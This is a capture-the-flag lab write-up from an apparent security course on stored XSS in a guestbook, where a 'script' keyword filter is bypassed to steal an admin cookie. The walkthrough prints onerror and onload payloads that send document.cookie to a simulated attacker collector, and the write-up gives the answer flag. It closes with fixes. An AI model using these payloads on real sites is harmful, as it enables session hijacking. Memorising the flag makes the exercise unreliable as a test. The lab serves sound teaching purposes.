# 06 — Stored XSS + Filter Bypass (steal the admin cookie) · Hard · 250 pts

**OWASP:** A03:2021 Injection (Stored XSS) · **Course ref:** Ch04 XSS, Lab4 stored XSS (`<img onerror>` technique),
Ch07 Filter Evasion & WAF Bypass (blacklists fail).

## Scenario / Briefing (shown to students in-app)
A guestbook stores every visitor's comment and shows it to everyone who opens the page later — including an **admin**
who reviews new comments. Store a script in a comment and it runs in *the admin's* browser, with the admin's session.
The catch: the word `script` is blocked — but blocking a keyword is not a defense (Ch7). Events like `onerror` and
`onload` run code too.
**Your objective:** store a payload that survives the filter, fires in the admin's browser, and steals the cookie
holding the flag.

## How the lab works
- `POST /comment` stores your comment and renders it **raw** for every viewer.
- A filter rejects any comment containing `script` (any case) — so `<script>` and `javascript:` are out.
- `/collect?c=...` is your (simulated) attacker server; everything it receives is listed at **`/collector`**.
- **🤖 Ask admin to review** (`POST /admin/visit`) simulates the admin opening the guestbook with the cookie
  `admin_session=<FLAG>`. Its "browser" runs event handlers that fire on page load (`onerror`, `onload`,
  `onfocus`+`autofocus`, `ontoggle`+`open`, …) — and if the handler reads `document.cookie` and sends it to
  `/collect`, the admin's cookie lands in the collector. No real external request is ever made.

## Walkthrough
1. Post `<b>hi</b>` → bold → HTML is rendered raw (stored XSS).
2. Post `<script>alert(1)</script>` → **Blocked by security filter**.
3. Post an event-handler payload:
   ```html
   <img src=x onerror=fetch('/collect?c='+document.cookie)>
   ```
   (or `<svg onload=fetch('/collect?c='+document.cookie)>`). It fires in **your** browser too — `/collector` shows
   your own `session=guest_…` cookie, which proves the payload works.
4. Click **🤖 Ask admin to review**, then open `/collector` → `admin_session=FLAG{…}`.

Flag: `FLAG{st0red_xss_filter_bypass}`

## The bug
- `waf_blocks()` is a keyword blacklist (`# ======= VULN HERE (filter) =======`).
- `guestbook()` outputs `c['text']` unescaped (`# ======= VULN HERE (output) =======`).

## The fix
Encode on output (`html.escape(c['text'])`) or sanitise with an allow-list HTML sanitiser; mark session cookies
`HttpOnly` (so `document.cookie` can't read them) and `SameSite`; add a CSP that forbids inline handlers.
